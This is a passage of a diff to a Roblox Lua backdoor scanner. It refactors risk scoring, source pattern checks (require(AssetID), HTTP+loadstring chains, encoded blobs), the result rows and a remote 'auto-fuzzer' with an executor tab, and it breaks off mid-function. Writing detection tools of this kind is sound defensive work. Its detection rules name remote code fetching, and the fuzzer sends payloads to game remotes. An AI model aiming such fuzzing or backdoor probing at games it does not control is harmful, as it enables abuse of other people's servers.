-bReset.MouseButton1Click:Connect(function() CFG.VERBOSE=true; CFG.SCAN_SCRIPTS=true; CFG.SCAN_ATTRS=true; CFG.SCAN_STRVALS=true; CFG.SCAN_OBFUSCATION=true; CFG.SCAN_GBRIDGE=true; CFG.LIVE_MONITOR=true; CFG.FIREWALL_MODE=false; CFG.INVOKE_TIMEOUT=5; CFG.MAX_EXEC_HISTORY=15; log("SYS","Settings reset to defaults.") end)
+local bReset = mkBtn(setList, "↺  Reset Settings to Defaults", T.BORA, T.TXT, UDim2.new(1,0,0,34))
+bReset.MouseButton1Click:Connect(function()
+    CFG.VERBOSE=true; CFG.SCAN_SCRIPTS=true; CFG.SCAN_ATTRS=true
+    CFG.SCAN_STRVALS=true; CFG.SCAN_OBFUSCATE=true; CFG.SCAN_GBRIDGE=true
+    CFG.LIVE_MONITOR=true; CFG.FIREWALL_MODE=false
+    CFG.INVOKE_TIMEOUT=5; CFG.MAX_EXEC_HIST=15; CFG.ENTROPY_LINE=280
+    log("SYS","Settings reset to defaults.")
+end)
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §15  RISK SCORING ENGINE
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
--- Scores are clamped 0-100.
 local function calcRemoteRisk(entry)
     local score = 0
-    -- Name heuristic match
     if entry.keyword then score += 40 end
-    -- High-risk service location
-    if entry.service == "ServerScriptService" then score += 15
-    elseif entry.service == "ServerStorage"   then score += 10 end
-    -- Has a script sibling (a remote inside a model that also has a script is very suspicious)
+    if entry.svc == "ServerScriptService" then score += 15
+    elseif entry.svc == "ServerStorage"   then score += 10 end
     local parent = entry.inst and entry.inst.Parent
     if parent then
         for _, c in ipairs(parent:GetChildren()) do
-            if c:IsA("Script") or c:IsA("LocalScript") or c:IsA("ModuleScript") then score += 12; break end
+            if c:IsA("Script") or c:IsA("LocalScript") or c:IsA("ModuleScript") then
+                score += 12; break
+            end
         end
     end
-    -- Fuzz result risk delta
     score += (entry.fuzzRisk or 0)
     return math.min(score, 100)
 end
 
-local function calcScriptRisk(flags, signatures)
+local function calcScriptRisk(flags, sigs)
     local score = 0
-    for _, f in ipairs(flags)      do score += (f.w or 5)  end
-    for _, sig in ipairs(signatures) do score += sig.risk  end
+    for _, f in ipairs(flags) do score += (f.w or 5) end
+    for _, sig in ipairs(sigs)  do score += sig.risk  end
     return math.min(score, 100)
 end
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §16  DETECTION HELPERS
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
-local function badName(name)
+local function isBadName(name)
     local low = name:lower()
     for _, kw in ipairs(CFG.BAD_NAMES) do
         if low:find(kw, 1, true) then return true, kw end
@@ -745,23 +1188,28 @@ local function recurse(root, out)
     return out
 end
 
-local function isHighEntropy(str)
-    if #str < 80 then return false end
-    local alpha=0; for _ in str:gmatch("%a") do alpha+=1 end
-    return (alpha/#str) < 0.18
+local function isHighEntropy(s)
+    if #s < 80 then return false end
+    local alpha = 0
+    for _ in s:gmatch("%a") do alpha += 1 end
+    return (alpha / #s) < 0.18
 end
 
 local function deepScanSource(inst)
     local flags, sigs = {}, {}
     local ok, src = pcall(function() return inst.Source end)
-    if not ok or type(src)~="string" or #src==0 then return flags, sigs end
+    if not ok or type(src) ~= "string" or #src == 0 then return flags, sigs end
 
     -- Pattern matching
+    local seenLabels = {}
     for _, p in ipairs(CFG.SRC_PATTERNS) do
-        if src:find(p.p) then flags[#flags+1]=p end
+        if not seenLabels[p.l] and src:find(p.p) then
+            flags[#flags+1] = p
+            seenLabels[p.l] = true
+        end
     end
 
-    -- Signature matching (multi-condition)
+    -- Signature matching
     for _, sig in ipairs(CFG.SIGNATURES) do
         local match = true
         for _, cond in ipairs(sig.conds) do
@@ -770,32 +1218,32 @@ local function deepScanSource(inst)
         if match then sigs[#sigs+1]=sig end
     end
 
-    -- Obfuscation: long lines
-    if CFG.SCAN_OBFUSCATION then
+    -- Long-line obfuscation
+    if CFG.SCAN_OBFUSCATE and not seenLabels["long line"] then
         for line in src:gmatch("[^\n]+") do
-            if #line > CFG.ENTROPY_LINE_LEN then
-                flags[#flags+1]={p="",l="long line (obfuscation, "..#line.." chars)",sev="WARN",w=15}; break
+            if #line > CFG.ENTROPY_LINE then
+                flags[#flags+1]={p="",l="long line ("..#line.." chars)",sev="WARN",w=15}; break
             end
         end
     end
 
-    -- Obfuscation: high-entropy string literals
-    if CFG.SCAN_OBFUSCATION then
+    -- High-entropy string blobs
+    if CFG.SCAN_OBFUSCATE and not seenLabels["high-entropy blob"] then
         for tok in src:gmatch('["\']([A-Za-z0-9+/=]{80,})["\']') do
             if isHighEntropy(tok) then
-                flags[#flags+1]={p="",l="high-entropy blob (encoded payload)",sev="CRIT",w=30}; break
+                flags[#flags+1]={p="",l="high-entropy blob",sev="CRIT",w=30}; break
             end
         end
     end
 
-    -- require(AssetID) — extract the actual IDs
+    -- Explicit require(AssetID) — extract IDs
     for id in src:gmatch("require%s*%(%s*(%d+)%s*%)") do
         flags[#flags+1]={p="",l="require("..id..")",sev="CRIT",w=40}
     end
 
     -- HTTP + loadstring chain
     if src:find("GetAsync") and src:find("loadstring") then
-        flags[#flags+1]={p="",l="HTTP+loadstring C2 chain",sev="CRIT",w=50}
+        flags[#flags+1]={p="",l="HTTP+loadstring chain",sev="CRIT",w=50}
     end
 
     return flags, sigs
@@ -807,531 +1255,730 @@ local function scanAttributes(inst)
     if not ok then return findings end
     for k, v in pairs(attrs) do
         local vs = tostring(v)
-        if vs:match("^%d%d%d%d%d%d%d") then findings[#findings+1]="Attr '"..k.."'="..vs.." (possible AssetID)" end
-        if vs:match("https?://")        then findings[#findings+1]="Attr '"..k.."' = URL: "..vs:sub(1,60) end
-        if #vs>60 and isHighEntropy(vs) then findings[#findings+1]="Attr '"..k.."' = high-entropy (encoded?)" end
+        if vs:match("^%d%d%d%d%d%d%d") then findings[#findings+1]="Attr '"..k.."'="..vs.." (AssetID?)" end
+        if vs:match("https?://")        then findings[#findings+1]="Attr '"..k.."'=URL: "..vs:sub(1,60) end
+        if #vs>60 and isHighEntropy(vs) then findings[#findings+1]="Attr '"..k.."'=high-entropy data" end
     end
     return findings
 end
 
 local function scanStrVal(inst)
     local findings = {}
-    if not (inst:IsA("StringValue")) then return findings end
+    if not inst:IsA("StringValue") then return findings end
     local ok, v = pcall(function() return tostring(inst.Value) end)
     if not ok then return findings end
-    if v:match("^%d%d%d%d%d%d%d")  then findings[#findings+1]="StringValue possible AssetID: "..v end
-    if v:match("https?://")         then findings[#findings+1]="StringValue URL: "..v:sub(1,80) end
-    if #v>60 and isHighEntropy(v)   then findings[#findings+1]="StringValue high-entropy data" end
+    if v:match("^%d%d%d%d%d%d%d") then findings[#findings+1]="StringValue AssetID?: "..v end
+    if v:match("https?://")        then findings[#findings+1]="StringValue URL: "..v:sub(1,80) end
+    if #v>60 and isHighEntropy(v)  then findings[#findings+1]="StringValue high-entropy data" end
     return findings
 end
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §17  RESULT ROW BUILDERS
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
+
+-- firewallRemote is declared as a global below (§20); referenced here in closures
+local function addToFuzzQueue(entry)
+    for _, q in ipairs(S.fuzzQueue) do
+        if q.path == entry.path then
+            log("WARN","Already queued: "..entry.path); return
+        end
+    end
+    S.fuzzQueue[#S.fuzzQueue+1] = entry
+
+    local qr = Instance.new("Frame")
+    qr.Size = UDim2.new(1,-8,0,22)
+    qr.BackgroundColor3 = Color3.fromRGB(18,12,28)
+    qr.BorderSizePixel = 0
+    qr.Parent = FuzzQueueList
+    mkCorner(qr, 3)
+    mkStroke(qr, T.PRP, 1)
+
+    local ql = mkLbl(qr, entry.path, 11, T.PRP, Enum.Font.Code)
+    ql.Size = UDim2.new(1,-30,1,0)
+    ql.Position = UDim2.new(0,4,0,0)
+
+    local entryPath = entry.path
+    local qb = mkBtn(qr, "✕", T.BG3, T.CRIT, UDim2.new(0,22,0,18))
+    qb.Position = UDim2.new(1,-24,0.5,-9)
+    qb.TextSize = 9
+    qb.MouseButton1Click:Connect(function()
+        for i, q in ipairs(S.fuzzQueue) do
+            if q.path == entryPath then table.remove(S.fuzzQueue,i); break end
+        end
+        qr:Destroy()
+        log("SYS","Removed from queue: "..entryPath)
+    end)
+
+    log("SYS","Added to fuzz queue: "..entry.path)
+    switchTab("Fuzzer")
+end
 
 local function addRemoteRow(entry)
-    local risk = entry.risk
-    local rc = riskColor(risk)
-    local isBad = risk >= 50
+    local rc = riskColor(entry.risk)
+    local isBad = entry.risk >= 50
+
     local row = Instance.new("Frame")
-    row.Size = UDim2.new(1,-8,0,28); row.BorderSizePixel=0; row.Parent=ResultsList; corner(row,4)
+    row.Size = UDim2.new(1,-8,0,28)
+    row.BorderSizePixel = 0
     row.BackgroundColor3 = isBad and Color3.fromRGB(34,14,14) or T.BG3
-    if isBad then stroke(row,Color3.fromRGB(100,20,20),1) end
+    row.Parent = ResultsList
+    mkCorner(row, 4)
+    if isBad then mkStroke(row, Color3.fromRGB(100,20,20), 1) end
 
-    -- Risk indicator bar (left edge)
-    local ind=Instance.new("Frame"); ind.Size=UDim2.new(0,3,0.65,0); ind.Position=UDim2.new(0,0,0.175,0); ind.BackgroundColor3=rc; ind.BorderSizePixel=0; ind.Parent=row; corner(ind,2)
+    local ind = Instance.new("Frame")
+    ind.Size = UDim2.new(0,3,0.65,0)
+    ind.Position = UDim2.new(0,0,0.175,0)
+    ind.BackgroundColor3 = rc
+    ind.BorderSizePixel = 0
+    ind.Parent = row
+    mkCorner(ind, 2)
 
-    -- Risk badge
-    local rb=lbl(row,tostring(risk),12,rc,Enum.Font.GothamBold,Enum.TextXAlignment.Center); rb.Size=UDim2.new(0,44,1,0); rb.Position=UDim2.new(0,6,0,0)
+    local rBadge = mkLbl(row, tostring(entry.risk), 12, rc, Enum.Font.GothamBold, Enum.TextXAlignment.Center)
+    rBadge.Size = UDim2.new(0,44,1,0)
+    rBadge.Position = UDim2.new(0,6,0,0)
 
-    -- Class
-    local cl=lbl(row,"["..entry.class.."]",11,isBad and T.CRIT or T.TXS,Enum.Font.Code); cl.Size=UDim2.new(0,96,1,0); cl.Position=UDim2.new(0,52,0,0)
+    local rClass = mkLbl(row, "["..entry.class.."]", 11, isBad and T.CRIT or T.TXS, Enum.Font.Code)
+    rClass.Size = UDim2.new(0,96,1,0)
+    rClass.Position = UDim2.new(0,52,0,0)
 
-    -- Path
-    local pt=lbl(row,entry.path,11,T.TXT,Enum.Font.Code); pt.Size=UDim2.new(0,238,1,0); pt.Position=UDim2.new(0,152,0,0)
+    local rPath = mkLbl(row, entry.path, 11, T.TXT, Enum.Font.Code)
+    rPath.Size = UDim2.new(0,238,1,0)
+    rPath.Position = UDim2.new(0,152,0,0)
 
-    -- Keyword / flag
-    local kw=lbl(row,entry.keyword or "—",10,isBad and T.WARN or T.TXM,Enum.Font.Code); kw.Size=UDim2.new(0,108,1,0); kw.Position=UDim2.new(0,395,0,0)
+    local rKw = mkLbl(row, entry.keyword or "—", 10, isBad and T.WARN or T.TXM, Enum.Font.Code)
+    rKw.Size = UDim2.new(0,116,1,0)
+    rKw.Position = UDim2.new(0,394,0,0)
 
-    -- Action buttons
-    local function rb2(t,bg,x,cb) local b=btn(row,t,bg,T.TXT,UDim2.new(0,24,0,20)); b.Position=UDim2.new(0,x,0.5,-10); b.TextSize=10; b.MouseButton1Click:Connect(cb); return b end
-    rb2("🛡",T.BRED,508,function() if entry.inst and entry.inst.Parent then firewallRemote(entry) end end)
-    rb2("▶",T.BGRN,536,function()
-        S.selRemote=entry.inst; TargetBox.Text=entry.path; switchTab("Executor"); log("INFO","Selected: "..entry.path)
+    -- Action micro-buttons
+    local function miniBtn(label, bg, xPos, cb)
+        local b = mkBtn(row, label, bg, T.TXT, UDim2.new(0,24,0,20))
+        b.Position = UDim2.new(0, xPos, 0.5, -10)
+        b.TextSize = 10
+        b.MouseButton1Click:Connect(cb)
+        return b
+    end
+
+    miniBtn("🛡", T.BRED, 514, function()
+        if entry.inst and entry.inst.Parent then firewallRemote(entry) end
     end)
-    rb2("🤖",T.BPUR,564,function()
-        -- Add to fuzz queue
-        for _, q in ipairs(S.fuzzQueue) do if q.path==entry.path then log("WARN","Already in fuzz queue: "..entry.path); return end end
-        S.fuzzQueue[#S.fuzzQueue+1]=entry
-        local qr=Instance.new("Frame"); qr.Size=UDim2.new(1,-8,0,22); qr.BackgroundColor3=Color3.fromRGB(18,12,28); qr.BorderSizePixel=0; qr.Parent=FuzzQueueList; corner(qr,3); stroke(qr,T.PRP,1)
-        local ql=lbl(qr,entry.path,11,T.PRP,Enum.Font.Code); ql.Size=UDim2.new(1,-30,1,0); ql.Position=UDim2.new(0,4,0,0)
-        local qb=btn(qr,"✕",T.BG3,T.CRIT,UDim2.new(0,22,0,18)); qb.Position=UDim2.new(1,-24,0.5,-9); qb.TextSize=9
-        qb.MouseButton1Click:Connect(function()
-            for i,q in ipairs(S.fuzzQueue) do if q.path==entry.path then table.remove(S.fuzzQueue,i); break end end
-            qr:Destroy(); log("SYS","Removed from queue: "..entry.path)
-        end)
-        log("SYS","Added to fuzz queue: "..entry.path); switchTab("Fuzzer")
+    miniBtn("▶", T.BGRN, 542, function()
+        S.selRemote = entry.inst
+        TargetBox.Text = entry.path
+        switchTab("Executor")
+        log("INFO","Selected: "..entry.path)
     end)
-    rb2("📋",T.HOV,592,function() pcall(setclipboard,entry.path); log("OK","Copied: "..entry.path) end)
+    miniBtn("🤖", T.BPUR, 570, function() addToFuzzQueue(entry) end)
+    miniBtn("📋", T.HOV,  598, function()
+        pcall(setclipboard, entry.path)
+        log("OK","Copied: "..entry.path)
+    end)
 end
 
 local function addScriptRow(entry)
-    local risk = entry.risk
-    local rc = riskColor(risk)
+    local rc = riskColor(entry.risk)
     local row = Instance.new("Frame")
-    row.Size=UDim2.new(1,-8,0,40); row.BorderSizePixel=0; row.Parent=ResultsList; corner(row,4)
-    row.BackgroundColor3=Color3.fromRGB(28,22,8); stroke(row,Color3.fromRGB(85,65,8),1)
+    row.Size = UDim2.new(1,-8,0,40)
+    row.BorderSizePixel = 0
+    row.BackgroundColor3 = Color3.fromRGB(28,22,8)
+    row.Parent = ResultsList
+    mkCorner(row, 4)
+    mkStroke(row, Color3.fromRGB(85,65,8), 1)
 
-    local ind=Instance.new("Frame"); ind.Size=UDim2.new(0,3,0.65,0); ind.Position=UDim2.new(0,0,0.175,0); ind.BackgroundColor3=rc; ind.BorderSizePixel=0; ind.Parent=row; corner(ind,2)
-    local rb=lbl(row,tostring(risk),12,rc,Enum.Font.GothamBold,Enum.TextXAlignment.Center); rb.Size=UDim2.new(0,44,1,0); rb.Position=UDim2.new(0,6,0,0)
-    local cl=lbl(row,"[Script]",11,T.WARN,Enum.Font.Code); cl.Size=UDim2.new(0,96,1,0); cl.Position=UDim2.new(0,52,0,0)
-    local pt=lbl(row,entry.path,11,T.TXT,Enum.Font.Code); pt.Size=UDim2.new(0,238,1,0); pt.Position=UDim2.new(0,152,0,0)
+    local ind = Instance.new("Frame")
+    ind.Size = UDim2.new(0,3,0.65,0)
+    ind.Position = UDim2.new(0,0,0.175,0)
+    ind.BackgroundColor3 = rc
+    ind.BorderSizePixel = 0
+    ind.Parent = row
+    mkCorner(ind, 2)
 
-    -- Show signatures (top line) + flags count (bottom line)
-    local sigNames={}; for _,sig in ipairs(entry.signatures) do sigNames[#sigNames+1]=sig.name end
+    local rb = mkLbl(row, tostring(entry.risk), 12, rc, Enum.Font.GothamBold, Enum.TextXAlignment.Center)
+    rb.Size = UDim2.new(0,44,1,0); rb.Position = UDim2.new(0,6,0,0)
+
+    local cl = mkLbl(row, "[Script]", 11, T.WARN, Enum.Font.Code)
+    cl.Size = UDim2.new(0,96,1,0); cl.Position = UDim2.new(0,52,0,0)
+
+    local pt = mkLbl(row, entry.path, 11, T.TXT, Enum.Font.Code)
+    pt.Size = UDim2.new(0,238,1,0); pt.Position = UDim2.new(0,152,0,0)
+
+    local sigNames = {}
+    for _, sig in ipairs(entry.sigs) do sigNames[#sigNames+1]=sig.name end
     local topLine = #sigNames>0 and ("🔴 "..table.concat(sigNames," · ")) or ""
-    local flagTxts={}; for _,f in ipairs(entry.flags) do flagTxts[#flagTxts+1]=f.l end
-    local botLine = table.concat(flagTxts," | ")
 
-    local tl=lbl(row,topLine,10,T.CRIT,Enum.Font.Code); tl.Size=UDim2.new(0,340,0,14); tl.Position=UDim2.new(0,152,0,14)
-    local bl=lbl(row,botLine,9,T.WARN,Enum.Font.Code);  bl.Size=UDim2.new(0,420,0,12); bl.Position=UDim2.new(0,152,1,-14)
+    local flagTxts = {}
+    for _, f in ipairs(entry.flags) do flagTxts[#flagTxts+1]=f.l end
+    local botLine = table.concat(flagTxts, " | ")
+
+    local tl = mkLbl(row, topLine, 10, T.CRIT, Enum.Font.Code)
+    tl.Size = UDim2.new(0,360,0,14); tl.Position = UDim2.new(0,152,0,14)
+
+    local bl = mkLbl(row, botLine, 9, T.WARN, Enum.Font.Code)
+    bl.Size = UDim2.new(0,430,0,12); bl.Position = UDim2.new(0,152,1,-14)
 end
 
 local function addAttrRow(inst, findings)
     for _, f in ipairs(findings) do
-        local row=Instance.new("Frame"); row.Size=UDim2.new(1,-8,0,24); row.BackgroundColor3=Color3.fromRGB(22,12,32); row.BorderSizePixel=0; row.Parent=ResultsList; corner(row,4); stroke(row,Color3.fromRGB(90,35,180),1)
-        local ind=Instance.new("Frame"); ind.Size=UDim2.new(0,3,0.65,0); ind.Position=UDim2.new(0,0,0.175,0); ind.BackgroundColor3=T.PRP; ind.BorderSizePixel=0; ind.Parent=row; corner(ind,2)
-        local cl=lbl(row,"[Attr]",11,T.PRP,Enum.Font.Code); cl.Size=UDim2.new(0,54,1,0); cl.Position=UDim2.new(0,6,0,0)
-        local cl2=lbl(row,"60",11,T.PRP,Enum.Font.GothamBold,Enum.TextXAlignment.Center); cl2.Size=UDim2.new(0,44,1,0); cl2.Position=UDim2.new(0,6,0,0)
-        local pt=lbl(row,inst:GetFullName(),11,T.TXT,Enum.Font.Code); pt.Size=UDim2.new(0,190,1,0); pt.Position=UDim2.new(0,60,0,0)
-        local fd=lbl(row,f,10,T.PRP,Enum.Font.Code); fd.Size=UDim2.new(0,380,1,0); fd.Position=UDim2.new(0,256,0,0)
+        local row = Instance.new("Frame")
+        row.Size = UDim2.new(1,-8,0,24)
+        row.BackgroundColor3 = Color3.fromRGB(22,12,32)
+        row.BorderSizePixel = 0
+        row.Parent = ResultsList
+        mkCorner(row, 4)
+        mkStroke(row, Color3.fromRGB(90,35,180), 1)
+        local cl = mkLbl(row, "[Attr]", 11, T.PRP, Enum.Font.Code); cl.Size=UDim2.new(0,54,1,0); cl.Position=UDim2.new(0,6,0,0)
+        local pt = mkLbl(row, inst:GetFullName(), 11, T.TXT, Enum.Font.Code); pt.Size=UDim2.new(0,196,1,0); pt.Position=UDim2.new(0,64,0,0)
+        local fd = mkLbl(row, f, 10, T.PRP, Enum.Font.Code); fd.Size=UDim2.new(0,380,1,0); fd.Position=UDim2.new(0,266,0,0)
     end
 end
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §18  MAIN SCANNER LOGIC  (4-pass deep scan)
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
 local stopScan = false
 
 local function runDeepScan()
     if S.isScanning then return end
     S.isScanning = true; stopScan = false
-    S.remotes={}; S.scripts={}; S.attrFinds={}; S.strvalFinds={}; S.gbridgeFinds={}
-    ResultsList:ClearAllChildren(); ll(ResultsList,3)
-    bScan.Text="⏳ Scanning…"; bScan.BackgroundColor3=T.ACC2
+    S.remotes={}; S.scripts={}; S.attrFinds={}; S.strvalFinds={}
+    ResultsList:ClearAllChildren(); mkList(ResultsList, 3)
+    bScan.Text = "⏳ Scanning…"; bScan.BackgroundColor3 = T.ACC2
 
     local t0 = os.clock()
-    log("INFO",("Deep Scan v%s — %d services · %d keywords · %d patterns · %d signatures"):format(
+    log("INFO", ("Deep Scan v%s — %d services · %d keywords · %d patterns · %d sigs"):format(
         CFG.VERSION, #CFG.SERVICES, #CFG.BAD_NAMES, #CFG.SRC_PATTERNS, #CFG.SIGNATURES))
 
     for idx, svcName in ipairs(CFG.SERVICES) do
         if stopScan then break end
         task.wait()
         local ok, svc = pcall(function() return game:GetService(svcName) end)
-        if not ok then log("WARN","Cannot access: "..svcName) else
-            TweenService:Create(ProgressFill,TweenInfo.new(0.18),{Size=UDim2.new(idx/#CFG.SERVICES,0,1,0)}):Play()
-            ProgressLabel.Text="[Pass 1-4] Scanning "..svcName.."…"
+        if not ok then
+            log("WARN","Cannot access: "..svcName)
+        else
+            local prog = idx / #CFG.SERVICES
+            TweenService:Create(ProgressFill, TweenInfo.new(0.18), {Size=UDim2.new(prog,0,1,0)}):Play()
+            ProgressLabel.Text = "[1-4] Scanning "..svcName.."…"
 
             for _, inst in ipairs(recurse(svc)) do
                 if stopScan then break end
 
-                -- ── Pass 1: Remote name heuristics ──────────────────────
+                -- Pass 1: Remote name heuristics
                 if inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction") then
-                    local bad, kw = badName(inst.Name)
-                    local entry = { inst=inst, svc=svcName, path=inst:GetFullName(), class=inst.ClassName, keyword=kw, fuzzRisk=0 }
+                    local bad, kw = isBadName(inst.Name)
+                    local entry = {
+                        inst=inst, svc=svcName, path=inst:GetFullName(),
+                        class=inst.ClassName, keyword=kw, fuzzRisk=0
+                    }
                     entry.risk = calcRemoteRisk(entry)
-                    S.remotes[#S.remotes+1]=entry
+                    S.remotes[#S.remotes+1] = entry
                     if bad or CFG.VERBOSE then addRemoteRow(entry) end
-                    if bad then log("CRIT",("Risk %d  %s '%s' (kw:'%s') @ %s"):format(entry.risk,inst.ClassName,inst.Name,kw or"?",entry.path)) end
+                    if bad then
+                        log("CRIT", ("Risk %d  %s '%s' (kw:'%s') @ %s"):format(
+                            entry.risk, inst.ClassName, inst.Name, kw or "?", entry.path))
+                    end
                     if bad and CFG.FIREWALL_MODE then firewallRemote(entry) end
                 end
 
-                -- ── Pass 2: Script deep analysis ─────────────────────────
+                -- Pass 2: Script source deep analysis
                 if CFG.SCAN_SCRIPTS and (inst:IsA("Script") or inst:IsA("LocalScript") or inst:IsA("ModuleScript")) then
                     local flags, sigs = deepScanSource(inst)
-                    if #flags>0 or #sigs>0 then
+                    if #flags > 0 or #sigs > 0 then
                         local risk = calcScriptRisk(flags, sigs)
-                        local e = { inst=inst, path=inst:GetFullName(), flags=flags, signatures=sigs, risk=risk }
-                        S.scripts[#S.scripts+1]=e; addScriptRow(e)
-                        local worst = #sigs>0 and "CRIT" or "WARN"
-                        log(worst,("Risk %d  Script '%s' — %d flags, %d signatures @ %s"):format(risk,inst.Name,#flags,#sigs,inst:GetFullName()))
+                        local e = {inst=inst, path=inst:GetFullName(), flags=flags, sigs=sigs, risk=risk}
+                        S.scripts[#S.scripts+1] = e
+                        addScriptRow(e)
+                        local level = #sigs>0 and "CRIT" or "WARN"
+                        log(level, ("Risk %d  Script '%s' — %d flags, %d sigs @ %s"):format(
+                            risk, inst.Name, #flags, #sigs, inst:GetFullName()))
                     end
                 end
 
-                -- ── Pass 3: Attribute scanning ───────────────────────────
+                -- Pass 3: Attribute scanning
                 if CFG.SCAN_ATTRS then
                     local aFinds = scanAttributes(inst)
-                    if #aFinds>0 then
-                        S.attrFinds[#S.attrFinds+1]={inst=inst,findings=aFinds}
-                        addAttrRow(inst,aFinds)
-                        for _, f in ipairs(aFinds) do log("WARN","[ATTR] "..inst:GetFullName().." — "..f) end
+                    if #aFinds > 0 then
+                        S.attrFinds[#S.attrFinds+1] = {inst=inst, findings=aFinds}
+                        addAttrRow(inst, aFinds)
+                        for _, f in ipairs(aFinds) do
+                            log("WARN","[ATTR] "..inst:GetFullName().." — "..f)
+                        end
                     end
                 end
 
-                -- ── Pass 4: StringValue scanning ─────────────────────────
+                -- Pass 4: StringValue scanning
                 if CFG.SCAN_STRVALS and inst:IsA("StringValue") then
                     local svF = scanStrVal(inst)
-                    if #svF>0 then
-                        S.strvalFinds[#S.strvalFinds+1]={inst=inst,findings=svF}
-                        for _, f in ipairs(svF) do log("WARN","[STRVAL] "..inst:GetFullName().." — "..f) end
+                    if #svF > 0 then
+                        S.strvalFinds[#S.strvalFinds+1] = {inst=inst, findings=svF}
+                        for _, f in ipairs(svF) do
+                            log("WARN","[STRVAL] "..inst:GetFullName().." — "..f)
+                        end
                     end
                 end
 
             end -- inst loop
-        end -- service ok
-    end -- services
+        end
+    end -- service loop
 
-    local elapsed = os.clock()-t0
-    local ns=0; for _,r in ipairs(S.remotes) do if r.risk>=50 then ns+=1 end end
-    statLabels["time"].Text=("%.1fs"):format(elapsed)
+    local elapsed = os.clock() - t0
+    local susp = 0
+    for _, r in ipairs(S.remotes) do if r.risk >= 50 then susp += 1 end end
+    statLabels["time"].Text = ("%.1fs"):format(elapsed)
     updateStats()
-    ProgressLabel.Text=("Done %.1fs — %d remotes (%d high-risk) · %d scripts · %d attr · %d strval"):format(elapsed,#S.remotes,ns,#S.scripts,#S.attrFinds,#S.strvalFinds)
-    TweenService:Create(ProgressFill,TweenInfo.new(0.3),{Size=UDim2.new(1,0,1,0)}):Play()
-    task.delay(2,function() TweenService:Create(ProgressFill,TweenInfo.new(0.5),{Size=UDim2.new(0,0,1,0)}):Play() end)
-    log("OK",("Scan done %.1fs — %d remotes (%d risk≥50) · %d scripts · %d attr · %d strval"):format(elapsed,#S.remotes,ns,#S.scripts,#S.attrFinds,#S.strvalFinds))
-    bScan.Text="⚡  Deep Scan"; bScan.BackgroundColor3=T.BBLU; S.isScanning=false
+    ProgressLabel.Text = ("Done %.1fs — %d remotes (%d high-risk) · %d scripts · %d attrs"):format(
+        elapsed, #S.remotes, susp, #S.scripts, #S.attrFinds)
+    TweenService:Create(ProgressFill, TweenInfo.new(0.3), {Size=UDim2.new(1,0,1,0)}):Play()
+    task.delay(2, function()
+        TweenService:Create(ProgressFill, TweenInfo.new(0.5), {Size=UDim2.new(0,0,1,0)}):Play()
+    end)
+    log("OK", ("Scan complete %.1fs — %d remotes (%d risk≥50) · %d scripts · %d attrs"):format(
+        elapsed, #S.remotes, susp, #S.scripts, #S.attrFinds))
+
+    bScan.Text = "⚡  Deep Scan"
+    bScan.BackgroundColor3 = T.BBLU
+    S.isScanning = false
 end
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §19  AUTO-FUZZER LOGIC
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
 local function addFuzzResult(path, payload, ok, response, riskDelta)
-    local row=Instance.new("Frame"); row.Size=UDim2.new(1,-8,0,38); row.BorderSizePixel=0; row.Parent=FuzzResultList; corner(row,4)
+    local row = Instance.new("Frame")
+    row.Size = UDim2.new(1,-8,0,38)
+    row.BorderSizePixel = 0
     row.BackgroundColor3 = ok and Color3.fromRGB(12,24,14) or Color3.fromRGB(30,12,12)
-    stroke(row, ok and Color3.fromRGB(20,80,30) or Color3.fromRGB(80,20,20),1)
+    row.Parent = FuzzResultList
+    mkCorner(row, 4)
+    mkStroke(row, ok and Color3.fromRGB(20,80,30) or Color3.fromRGB(80,20,20), 1)
 
-    local ind=Instance.new("Frame"); ind.Size=UDim2.new(0,3,0.65,0); ind.Position=UDim2.new(0,0,0.175,0); ind.BackgroundColor3=ok and T.OK or T.CRIT; ind.BorderSizePixel=0; ind.Parent=row; corner(ind,2)
+    local ind = Instance.new("Frame")
+    ind.Size = UDim2.new(0,3,0.65,0)
+    ind.Position = UDim2.new(0,0,0.175,0)
+    ind.BackgroundColor3 = ok and T.OK or T.CRIT
+    ind.BorderSizePixel = 0
+    ind.Parent = row
+    mkCorner(ind, 2)
 
-    local pl=lbl(row,path,11,T.TXT,Enum.Font.Code); pl.Size=UDim2.new(1,-10,0,14); pl.Position=UDim2.new(0,6,0,3)
-    local py=lbl(row,"Payload: "..payload:sub(1,60),10,T.TXS,Enum.Font.Code); py.Size=UDim2.new(1,-10,0,12); py.Position=UDim2.new(0,6,0,18)
-    local rs=lbl(row,(ok and "OK" or "FAIL").." → "..tostring(response):sub(1,80),10,ok and T.OK or T.CRIT,Enum.Font.Code); rs.Size=UDim2.new(1,-10,0,12); rs.Position=UDim2.new(0,6,1,-14)
+    local l1 = mkLbl(row, path, 11, T.TXT, Enum.Font.Code)
+    l1.Size = UDim2.new(1,-10,0,14); l1.Position = UDim2.new(0,6,0,3)
 
-    if riskDelta and riskDelta>0 then
-        local rd=lbl(row,"⬆ Risk +"..riskDelta,10,T.CRIT,Enum.Font.GothamBold); rd.Size=UDim2.new(0,80,0,14); rd.Position=UDim2.new(1,-84,0,3); rd.TextXAlignment=Enum.TextXAlignment.Right
+    local l2 = mkLbl(row, "Payload: "..payload:sub(1,70), 10, T.TXS, Enum.Font.Code)
+    l2.Size = UDim2.new(1,-10,0,12); l2.Position = UDim2.new(0,6,0,18)
+
+    local l3 = mkLbl(row, (ok and "OK" or "FAIL").." → "..tostring(response):sub(1,80), 10, ok and T.OK or T.CRIT, Enum.Font.Code)
+    l3.Size = UDim2.new(1,-10,0,12); l3.Position = UDim2.new(0,6,1,-14)
+
+    if riskDelta and riskDelta > 0 then
